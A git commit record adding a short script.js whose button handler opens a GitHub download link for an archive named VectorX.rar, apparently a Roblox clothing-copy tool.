e964794f5d779028b4e1a94c37e51e43394f6e8c
Ryzen <125817626+Ryzen-Developper@users.noreply.github.com>
2025-03-23 08:57:21 -0300

    Update script.js

---
+++ script.js
@@ -0,0 +1,3 @@
+document.getElementById("downloadBtn").addEventListener("click", function() {
+    window.open("https://github.com/Ryzen-Developper/VectorX---Copy-Clothes-Roblox/raw/refs/heads/main/VectorX.rar", "_blank");
+});
